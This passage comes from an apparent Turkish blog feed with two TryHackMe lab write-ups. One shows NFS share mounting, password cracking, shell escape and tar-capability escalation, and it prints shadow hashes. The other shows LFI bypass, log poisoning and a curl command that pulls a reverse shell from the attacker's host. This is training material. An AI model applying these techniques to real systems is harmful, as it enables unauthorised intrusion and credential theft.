1. Keşif Aşaması Nmap ile port taraması yapıldığında tüm portların açık olduğu görülmektedir.😥 Makina tasarımcısı tarafından keşif işlemine 1337 numaralı port ile başlamamız söylenmektedir. Telnet ile porta bağlantı sağlanır.
telnet 10.10.225.52 1337  Bağlantı ile ilgili ipucunun ilk 100 portta yer aldığı ve tespit için bannerların yazdırılarak bulunabileceği belirtilmiştir. (Bir şu trollface meselesi var.</description>
            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazımda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/theserverfromhell">The Server From Hell</a> adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</em></p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Nmap ile port taraması yapıldığında tüm portların açık olduğu görülmektedir.😥 Makina tasarımcısı tarafından keşif işlemine 1337 numaralı port ile başlamamız söylenmektedir. Telnet ile porta bağlantı sağlanır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">telnet 10.10.225.52 <span style="color:#ae81ff">1337</span>
</code></pre></div>
    <img src="/images/thm/theserverfromhell/telnet.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Bağlantı ile ilgili ipucunun ilk 100 portta yer aldığı ve tespit için bannerların yazdırılarak bulunabileceği belirtilmiştir. (Bir şu trollface meselesi var. Beni en çok uğraştıran kısmı bu oldu. Bulunca bir aydınlanma yaşamadım değil tabi&hellip;)</p>
<p>Bu aşamadan sonra banner tespiti için nmap&rsquo;in banner scripti kullanılabilir. Ben burada nc ile ilk yüz porta sıra ile bağlantı denemeleri yaparak banner tespiti yaptım.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -v 10.10.225.52 1-100
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 49 (tacacs) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 48 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 47 (?) open
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff0010.10.225.52 [10.10.225.52] 46 (?) open
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff0010.10.225.52 [10.10.225.52] 45 (?) open
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff0010.10.225.52 [10.10.225.52] 44 (?) open
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff0010.10.225.52 [10.10.225.52] 43 (whois) open
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff0010.10.225.52 [10.10.225.52] 42 (?) open
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff0010.10.225.52 [10.10.225.52] 41 (?) open
550 12345 0fffffffffffffffffff700008888800000000088000080007fff0010.10.225.52 [10.10.225.52] 40 (?) open
550 12345 0fffffffffffffffff70008878800000000000008878008007fff0010.10.225.52 [10.10.225.52] 39 (?) open
550 12345 0fffffffffffffff800888880000000000000000000800800cfff0010.10.225.52 [10.10.225.52] 38 (?) open
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff0010.10.225.52 [10.10.225.52] 37 (time) open
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff0010.10.225.52 [10.10.225.52] 36 (?) open
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff0010.10.225.52 [10.10.225.52] 35 (?) open
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff0010.10.225.52 [10.10.225.52] 34 (?) open
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff0010.10.225.52 [10.10.225.52] 33 (?) open
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff0010.10.225.52 [10.10.225.52] 32 (?) open
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff0010.10.225.52 [10.10.225.52] 31 (?) open
550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff0010.10.225.52 [10.10.225.52] 30 (?) open
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff0010.10.225.52 [10.10.225.52] 29 (?) open
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff0010.10.225.52 [10.10.225.52] 28 (?) open
550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff0010.10.225.52 [10.10.225.52] 27 (?) open
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff0010.10.225.52 [10.10.225.52] 26 (?) open
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff0010.10.225.52 [10.10.225.52] 25 (smtp) open
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff0010.10.225.52 [10.10.225.52] 24 (?) open
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff0010.10.225.52 [10.10.225.52] 23 (telnet) open
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff0010.10.225.52 [10.10.225.52] 22 (ssh) open
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff0010.10.225.52 [10.10.225.52] 21 (ftp) open
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf0010.10.225.52 [10.10.225.52] 20 (ftp-data) open
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf0010.10.225.52 [10.10.225.52] 19 (chargen) open
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff0010.10.225.52 [10.10.225.52] 18 (?) open
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff0010.10.225.52 [10.10.225.52] 17 (qotd) open
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff0010.10.225.52 [10.10.225.52] 16 (?) open
550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff0010.10.225.52 [10.10.225.52] 15 (netstat) open
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff0010.10.225.52 [10.10.225.52] 14 (?) open
550 12345 0fffffff8000000000008888000000000080000000000007fffff0010.10.225.52 [10.10.225.52] 13 (daytime) open
550 12345 0ffffffff000000888000000000800000080000008800007fffff0010.10.225.52 [10.10.225.52] 12 (?) open
550 12345 0ffffffff80008808880000000880000008880088800008ffffff0010.10.225.52 [10.10.225.52] 11 (systat) open
550 12345 0fffffffff000088808880000000000000088800000008fffffff0010.10.225.52 [10.10.225.52] 10 (?) open
550 12345 0fffffffff70000088800888800088888800008800007ffffffff0010.10.225.52 [10.10.225.52] 9 (discard) open
550 12345 0ffffffffff80000088808000000888800000008887ffffffffff0010.10.225.52 [10.10.225.52] 8 (?) open
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff0010.10.225.52 [10.10.225.52] 7 (echo) open
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff0010.10.225.52 [10.10.225.52] 6 (?) open
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff0010.10.225.52 [10.10.225.52] 5 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 4 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 3 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 2 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 1 (tcpmux) open
550 12345 0000000000000000000000000000000000000000000000000000000─
</code></pre></div><p>Dikkatli bakınca 21. porttan dönen cevapta 12345 numaralı porta gidilmesi söylenmiştir. Ayrıca bizim trollface de baş aşağı görülmektedir. Aşağıda sizler için düzeltilmiş hali yer almaktadır. 😜</p>

    <img src="/images/thm/theserverfromhell/trollface.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p><strong>Telnet</strong> ile 12345 portuna bağlantı sağlanılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">telnet 10.10.225.52 <span style="color:#ae81ff">12345</span>
</code></pre></div>
    <img src="/images/thm/theserverfromhell/12345.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>NFS ile ilgili bir ikaz yer almaktadır. <em><strong>Showmount</strong></em> aracı ile sistemde nfs ile bir dosya paylaşımı yapılıp yapılmadığı kontrol edilir.</p>
<pre><code>showmount -e 10.10.225.52
</code></pre>
    <img src="/images/thm/theserverfromhell/nfss.png"  alt="Hello Friend"  class="center"  style="border-radius: 4px;"  />


<p>Paylaşıma açık olan <em><strong>/home/nfs</strong></em> dizini localhosta mount edilerek paylaşım görüntülenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo mkdir /tmp/mnt
sudo mount -t nfs 10.10.225.52:/home/nfs /tmp/mnt/ 
</code></pre></div><p>Localhostta <em><strong>/tmp/mnt/</strong></em> dizinine gidilerek dizin listelendiğinde backup.zip adında bir dosya tespit edilir. Dosya /tmp dizinine açılmaya çalışıldığında parola koruması olduğu görülür.</p>

    <img src="/images/thm/theserverfromhell/backup.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Zip dosyasının parola hash bilgisi <em><strong>zip2john</strong></em> aracı ile çıkarılır ve <em><strong>john</strong></em> ile sözlük saldırısı yapılarak parola elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">zip2john backup.zip &gt; ../hash

john -wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt ../hash 
Using default input encoding: UTF-8
Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>PKZIP <span style="color:#f92672">[</span>32/64<span style="color:#f92672">])</span>
Will run <span style="color:#ae81ff">2</span> OpenMP threads
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
zxcvbnm          <span style="color:#f92672">(</span>backup.zip<span style="color:#f92672">)</span>
1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2020-11-04 11:28<span style="color:#f92672">)</span> 33.33g/s 136533p/s 136533c/s 136533C/s 123456..oooooo
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div><p><em><strong>Unzip</strong></em> ile dosya açılır.</p>

    <img src="/images/thm/theserverfromhell/unzip.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>İlk flag dosyası okunur.</p>

    <img src="/images/thm/theserverfromhell/flag1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Hades kullanıcısna ait ssh anahtarları görülmektedir. Hades kullanıcına ait private anahtar kullanılarak ssh bağlantısı sağlanılır. Ssh bağlantısı için açık port bulmak gerekmektedir. <em><strong>hint.txt</strong></em> dosyasına bakıldığında <em>2500-4500</em> port aralığı verilmiştir. Nmap ile aralıktaki portlar taranır.</p>
<pre><code>nmap -sV -p2500-4500 10.10.225.52 
</code></pre><p>Elde edilen çıktıda ssh araması yapılır. Tespit edilen portlara bağlantı denemeleri yapıldığında 3333 numaralı portun açık olduğu görülmektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">3333/tcp open  dec-notes
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
</code></pre></div><h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Hades kullanıcısa ait ssh anahtarı kullanılarak <em>3333</em> numaralı porttan ssh bağlantısı sağlanır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i .ssh/id_rsa -p <span style="color:#ae81ff">3333</span> root@10.10.225.52
</code></pre></div>
    <img src="/images/thm/theserverfromhell/ssh.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p><em><strong>irb</strong></em> adlı bir uygulamaya bağlanılmıştır. Yapılan araştırmada interaktif ruby yorumlayıcısı olduğu tespit edilir. <code>exec '/bin/bash'</code> komutu bash kabuğuna geçilir.</p>

    <img src="/images/thm/theserverfromhell/bash.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>User.txt dosyası okunarak ikinci flag elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">cat user.txt
thm{sh3ll_3c4p3_15_v3ry_1337}
</code></pre></div><h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Yetki yükseltmek için LinEnum.sh betiği hedef makinaya yüklenir. Betik çalıştırıldığında <em><strong>getcap</strong></em> çıktısı dikkat çekmektedir.</p>

    <img src="/images/thm/theserverfromhell/priv.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p><em>Tar uygulaması için okuma (read) yetkisinin root yetkisi (ep) ile yapılabileceği görülmektedir.</em> Flag dosyasını elde etmek için direk /root dizini arşivlenir ve sıkıştırılan dosya açılarak makina çözümü tamamlanır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">###Compress</span>

hades@hell:/tmp/etc$ /bin/tar -cvf root.tar /root
/bin/tar: Removing leading <span style="color:#e6db74">`</span>/<span style="color:#960050;background-color:#1e0010">&#39;</span> from member names
/root/
/root/.gnupg/
/root/.gnupg/private-keys-v1.d/
/root/.bashrc
/root/root.txt
/root/.bash_history
/root/.ssh/
/root/.ssh/authorized_keys
/root/.cache/
/root/.cache/motd.legal-displayed
/root/.profile

<span style="color:#75715e">###Decompress</span>
hades@hell:/tmp/etc$ ls
root.tar  shadow

hades@hell:/tmp/etc$ tar -xvf root.tar 
root/
root/.gnupg/
root/.gnupg/private-keys-v1.d/
root/.bashrc
root/root.txt
root/.bash_history
root/.ssh/
root/.ssh/authorized_keys
root/.cache/
root/.cache/motd.legal-displayed
root/.profile
</code></pre></div>
    <img src="/images/thm/theserverfromhell/root.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Root yetkisi elde etmek için <em><strong>shadow</strong></em> dosyası arşivlenerek okunur. Daha sonra <em><strong>passwd</strong></em> dosyası okunur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat shadow 

root:$6$gOnbjpUs$c0IEFcbrGocU26kyzzPOqzY02e7bcawNexPsEm3oENaBIw7mVz/h9dOgaDaphveFY9ScIetMiI8F/XOnTxJxi1:18520:0:99999:7:::
daemon:*:18513:0:99999:7:::
bin:*:18513:0:99999:7:::
sys:*:18513:0:99999:7:::
sync:*:18513:0:99999:7:::
games:*:18513:0:99999:7:::
man:*:18513:0:99999:7:::
lp:*:18513:0:99999:7:::
mail:*:18513:0:99999:7:::
news:*:18513:0:99999:7:::
uucp:*:18513:0:99999:7:::
proxy:*:18513:0:99999:7:::
www-data:*:18513:0:99999:7:::
backup:*:18513:0:99999:7:::
list:*:18513:0:99999:7:::
irc:*:18513:0:99999:7:::
gnats:*:18513:0:99999:7:::
nobody:*:18513:0:99999:7:::
systemd-network:*:18513:0:99999:7:::
systemd-resolve:*:18513:0:99999:7:::
syslog:*:18513:0:99999:7:::
messagebus:*:18513:0:99999:7:::
_apt:*:18513:0:99999:7:::
lxd:*:18513:0:99999:7:::
uuidd:*:18513:0:99999:7:::
dnsmasq:*:18513:0:99999:7:::
landscape:*:18513:0:99999:7:::
sshd:*:18513:0:99999:7:::
pollinate:*:18513:0:99999:7:::
vagrant:$6$XQAwkysB$wSkezwLStg6E8nT/h5ECcNdiBuGt98yNnjwVEB.YVEAQY9z5AamgBhYTUAzKRQjmNxpEOLP/a36mxdZyaKJk60:18513:0:99999:7:::
ubuntu:!:18520:0:99999:7:::
statd:*:18520:0:99999:7:::
ntp:*:18520:0:99999:7:::
hades:*:18520:0:99999:7:::

---------------------------------------------------------------

cat /etc/passwd

root❌0:0:root:/root:/bin/bash
daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin❌2:2:bin:/bin:/usr/sbin/nologin
sys❌3:3:sys:/dev:/usr/sbin/nologin
sync❌4:65534:sync:/bin:/bin/sync
games❌5:60:games:/usr/games:/usr/sbin/nologin
man❌6:12:man:/var/cache/man:/usr/sbin/nologin
lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail❌8:8:mail:/var/mail:/usr/sbin/nologin
news❌9:9:news:/var/spool/news:/usr/sbin/nologin
uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy❌13:13:proxy:/bin:/usr/sbin/nologin
www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
backup❌34:34:backup:/var/backups:/usr/sbin/nologin
list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network❌100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog❌102:106::/home/syslog:/usr/sbin/nologin
messagebus❌103:107::/nonexistent:/usr/sbin/nologin
_apt❌104:65534::/nonexistent:/usr/sbin/nologin
lxd❌105:65534::/var/lib/lxd/:/bin/false
uuidd❌106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq❌107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape❌108:112::/var/lib/landscape:/usr/sbin/nologin
sshd❌109:65534::/run/sshd:/usr/sbin/nologin
pollinate❌110:1::/var/cache/pollinate:/bin/false
vagrant❌1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu❌1001:1001:Ubuntu:/home/ubuntu:/bin/bash
statd❌111:65534::/var/lib/nfs:/usr/sbin/nologin
ntp❌112:116::/nonexistent:/usr/sbin/nologin
hades❌1002:1002:0,0,0,0:/home/hades:/usr/bin/irb
</code></pre></div><p><em><strong>Unshadow</strong></em> <em>aracı kullanılarak hesaplara ait hash bilgileri john ile kırılmak üzere hazır hale getirilir.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">unshadow passwd shadow &gt; crackhash
</code></pre></div><p>John aracı kullanılarak root parolası elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">─<span style="color:#f92672">[</span>barcode@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ john -wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt crackhash 
Using default input encoding: UTF-8
Loaded <span style="color:#ae81ff">2</span> password hashes with <span style="color:#ae81ff">2</span> different salts <span style="color:#f92672">(</span>sha512crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $6$ <span style="color:#f92672">[</span>SHA512 256/256 AVX2 4x<span style="color:#f92672">])</span>
Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">5000</span> <span style="color:#66d9ef">for</span> all loaded hashes
Will run <span style="color:#ae81ff">2</span> OpenMP threads
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
trustno1         <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
1g 0:00:00:06 0.07% <span style="color:#f92672">(</span>ETA: 14:56:04<span style="color:#f92672">)</span> 0.1494g/s 1798p/s 1951c/s 1951C/s 123qaz..hawkeye
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session aborted
</code></pre></div><p>Root hesabıyla ssh bağlantısı sağlanır.</p>

    <img src="/images/thm/theserverfromhell/root2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


]]></content>
        </item>
        
        <item>
            <title>THM Dogcat Write Up</title>
            <link>https://barcode91.github.io/posts/2020/10/thm-dogcat-write-up/</link>
            <pubDate>Wed, 14 Oct 2020 21:45:22 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/thm-dogcat-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki DogCat adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
1. Keşif Aşaması Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
sudo nmap -sV -sC 10.10.35.38  Sistemde sadece 2 port açıktır. Web sayfasına giriş yapılır. Anasayfada yer alan dog ve cat butonlarına tıklanarak adres çubuğuna dikkatle bakılır.
 LFI zafiyeti kontrolü için /etc/passwd dosyası okunmaya çalışılır.
Dog ve cat dışındaki dosyalar filtreye takılımaktadır.</description>
            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazımda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/dogcat">DogCat</a> adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</em></p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.35.38
</code></pre></div>
    <img src="/images/thm/dogcat/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Sistemde sadece 2 port açıktır. Web sayfasına giriş yapılır. Anasayfada yer alan dog ve cat butonlarına tıklanarak adres çubuğuna dikkatle bakılır.</p>
<p>
    <img src="/images/thm/dogcat/web1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<br>

    <img src="/images/thm/dogcat/web2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />

</p>
<p>LFI zafiyeti kontrolü için /etc/passwd dosyası okunmaya çalışılır.</p>

    <img src="/images/thm/dogcat/lfi1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Dog ve cat dışındaki dosyalar filtreye takılımaktadır. Dog ibaresi eklenerek test tekrarlanır.</p>

    <img src="/images/thm/dogcat/lfi2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Dog ve cat filtresi baypass edilidiğinde dosyaya otomatik olarak .php uzantısı eklendiği görülmektedir. Php filter kullanılarak index.php dosyası okunmaya çalışılır.</p>
<pre><code class="language-url" data-lang="url">?view=php://filter/convert.base64-encode/resource=./dog/../index
</code></pre><p>index.php dosyası başarılı bir şekilde okunur. Sonuç base64 ile decode edilir. Index.php içerisindeki php kodları incelenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">containsStr</span>($str, $substr) {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strpos</span>($str, $substr) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>;
    }
    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;ext&#34;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#34;ext&#34;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;.php&#39;</span>;
    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>])) {
        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;dog&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;cat&#39;</span>)) {
            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Here you go!&#39;</span>;
            <span style="color:#66d9ef">include</span> $_GET[<span style="color:#e6db74">&#39;view&#39;</span>] <span style="color:#f92672">.</span> $ext;
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Sorry, only dogs or cats are allowed.&#39;</span>;
        }
    }
<span style="color:#75715e">?&gt;</span>
</code></pre></div><p><strong>containsStr()</strong> metodu ile dog ve cat ifadeleri kontrol edilmektedir. Get isteğinde <strong>ext</strong> parametresi yok ise php uzantısının otomatik olarak eklendiği görülmektedir. İstek yapılırken <strong>&amp;ext</strong> kullanılarak uzantı ekleme kısmı baypass edilir.</p>
<p><em>LFI zafiyetinden RCE (Remote Code Execution) oluşturabilmek için tarayıcıdan LFI ile okunabilen bir dosyaya php kodu enjekte edilmelidir. Apache logları kontrol edilir. Özellikle access.log dosyasında web servisine atılan tüm isteklerin header bilgileri kayıt edilmektedir. Log dosyası okunmaya çalışılır.</em></p>
<pre><code class="language-url" data-lang="url">?view=./dog/../../../../var/log/apache2/access.log&amp;ext=
</code></pre>
    <img src="/images/thm/dogcat/logpage.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Log içeriklerine bakıldığında <em><strong>User-Agent</strong></em> bilgisininde kayıt edildiği görülmektedir. User-Agent bilgisi kod çalıştırabilecek bir php kodu ile değiştirilip istek atıldığında isteğin başlık bilgisi, log dosyasına kayıt edilir. İşlem Burpsuite aracı kullanılarak yapılır.</p>

    <img src="/images/thm/dogcat/user.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Daha sonra test için cmd parametresine id değeri verilerek apache access log dosyası okunmaya çalışılır.</p>
<pre><code class="language-url" data-lang="url">?view=./dog/../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=id
</code></pre>
    <img src="/images/thm/dogcat/id.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>id komutu başarılı ile çalışmaktadır. Bu aşamadan sonra shell bağlantısı için birçok yol izlenebilir. Biz burada sisteme dosya upload ederek shell bağlantısı alacağız.</p>
<p>Localhostta python3 http.server modulü kullanılarak web sunucusu ayağa kaldırılır. Daha sonra</p>
<pre><code>&amp;cmd=curl http://10.9.62.67:8000/reverse.php -o reverse.php 
</code></pre><p>komutu adres çubuğuna eklenir.</p>
<pre><code class="language-url" data-lang="url">?view=./dog/../../../../var/log/apache2/access.log&amp;ext=&amp;&amp;cmd=curl http://10.9.62.67:8000/reverse.php -o reverse.php
</code></pre>
    <img src="/images/thm/dogcat/server.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Ayarlanan port dinlemeye başlanır. Daha sonra tarayıcıdan yüklenen dosyaya istek atılır ve shell bağlantısı sağlanır.</p>
<p><code>http://10.10.35.38/reverse.php</code></p>

    <img src="/images/thm/dogcat/shell.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Web dizine bakıldığında birinci flag dosyası okunur.</p>

    <img src="/images/thm/dogcat/flag1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p><code>sudo -l</code> komutu ile <em>www-data</em> kullanısının yetkileri kontrol edilir. <strong>env</strong> komutunun parola gerektirmeden root yetkisi ile çalıştırılabileceği tespit edilir.</p>

    <img src="/images/thm/dogcat/priv.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Aşağıdaki komut ile <em><strong>env</strong></em> uygulaması ile yetki yükseltilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /usr/bin/env /bin/bash 
</code></pre></div>
    <img src="/images/thm/dogcat/root1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p><strong>find</strong> komutu ile sistemdeki diğer flag dosyaları aranır. flag2 ve flag3 dosyaları tespit edilir. Root yetkisinde olduğumuzdan flaglar kolayca okunur.</p>

    <img src="/images/thm/dogcat/flags.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />


<p>Makinadaki toplam 4 adet flag dosyasından 3 tanesi tespit edilmiştir.</p>

    <img src="/images/thm/dogcat/makina.png"  alt="Hello Friend"  class="center"  />


<p>Makina adına dikkatlice bakıldığında docker container içerisinde olduğumuz görülmektedir. Diğer flag dosyası için container dışına çıkmamız gerekmektedir.</p>
